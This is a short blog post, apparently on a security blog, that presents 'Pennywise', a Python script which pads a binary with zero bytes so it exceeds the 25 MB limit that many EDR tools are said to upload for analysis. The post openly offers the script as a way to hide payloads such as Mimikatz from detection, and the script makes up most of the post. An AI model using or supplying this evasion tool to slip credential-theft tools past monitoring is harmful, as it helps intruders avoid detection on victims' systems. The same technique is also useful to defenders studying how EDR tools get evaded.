---

layout: post
title: Pennywise EDR evasion
---

<img height="200" align="left" src="/images/pennywise.png"> <br><br>Wanna have a balloon? This Tiny script helps to hide your payload (like Mimikatz.exe) by inflating the Binary like a red ballon. Most EDR Tools only transfer the first 25 MB to the Server, so why not filling up the payload with some garbage and play some mind tricks? This change of the file size will keep the binary as it is but busts the file size. TIme to get evil ...

<br><br><br><br><br><br>
Tiny intro how this script works:

![](../images/pennywise_inflate.gif)

```python
#!/usr/bin/env python3
import argparse
import struct
import sys


parser = argparse.ArgumentParser(
    description="Pennywise's Red Balloon - Inflate your Payload"
)

parser.add_argument(
    "-f",
    "--file",
    help="Binary or file path including the binary",
)

parser.add_argument(
    "-s", 
    "--size",
    default=150,
    help="Size in MB to inflate binary - Default 150 MB", 
    type=int
)

args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.file:
    print("[!] Binary or path to a binary required!\n\n"
    "\t$ python -f c:\\fun\\mimikatz.exe -s 100\n"
    "\t$ python -f mimikatz.exe -s 250\n\n")
    parser.print_help()
    sys.exit(1)    

def transform(file, size):
    print("[!]\tInflating %s by %s MB" % (file, size))
    blank_bytes = struct.pack('B', 0)
    
    with open(file, 'ab') as file:
        file.write(blank_bytes * 1024 * 1024 * size)
        
    print("[!]\tOperation Complete...\n")

if __name__ == "__main__":
    transform(args.file, args.size)
```
